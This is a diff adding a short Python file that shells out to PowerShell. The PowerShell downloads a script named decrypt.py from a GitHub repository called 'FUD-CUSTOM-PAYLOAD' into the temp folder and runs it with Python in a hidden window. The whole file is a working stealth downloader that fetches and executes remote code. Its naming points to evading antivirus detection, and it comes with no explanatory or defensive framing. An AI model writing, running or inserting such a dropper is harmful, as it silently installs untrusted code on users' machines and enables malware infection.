@@ -1,0 +1,11 @@
+import subprocess
+
+# Define the PowerShell command as a string
+powershell_command = """
+$TempFile = [System.IO.Path]::Combine($env:TEMP, 'decrypt.py'); 
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/decrypt.py' -OutFile $TempFile; 
+Start-Process -FilePath 'python' -ArgumentList $TempFile -WindowStyle Hidden
+"""
+
+# Open PowerShell and execute the command
+subprocess.Popen(["powershell.exe", "-NoExit", "-Command", powershell_command])
